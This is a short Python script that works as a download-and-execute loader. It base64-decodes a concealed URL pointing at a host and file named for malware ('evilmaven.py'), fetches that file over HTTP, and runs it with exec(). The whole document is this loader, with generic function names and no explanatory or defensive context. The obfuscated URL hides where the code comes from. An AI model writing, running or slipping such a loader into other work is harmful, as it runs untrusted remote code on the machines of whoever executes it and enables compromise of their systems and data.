import base64
import requests
from io import StringIO

def func_a():
    url = "aHR0cDovL3N3bWFpbC5tYWx3YXJlLmluZGV4L2V2aWxtYXZlbi5weQ=="
    url_decoded = base64.b64decode(url).decode("utf-8")
    response = requests.get(url_decoded)
    return response.text

def func_b(source_code):
    code_buffer = StringIO(source_code)
    global_vars = {}
    local_vars = {}
    exec(code_buffer.getvalue(), global_vars, local_vars)

def main():
    source_code = func_a()
    func_b(source_code)

if __name__ == '__main__':
    main()
     